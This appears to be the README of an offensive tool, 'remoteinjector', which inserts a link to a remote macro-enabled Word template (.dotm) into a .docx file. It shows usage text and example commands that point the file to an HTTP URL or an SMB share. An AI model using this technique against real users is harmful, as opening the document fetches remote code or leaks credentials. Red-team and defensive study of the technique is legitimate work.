# remoteinjector
Injects link to remote word template into word document
## Requirements
- Python2.7
## Usage
'''
usage: remoteinjector.py [-h] [-w URL] F

Inject Template Through Relationship Settings

positional arguments:
  F           .docx file to inject template into

optional arguments:
  -h, --help  show this help message and exit
  -w URL      remote http url to template

Example of use
To inject remote http url:

        remoteinjector.py -w https://example.com/template.dotm example.docx

To inject SMB path:

        remoteinjector.py -w \\1.1.1.1\C$\TEMP\template.dotm example.docx
'''
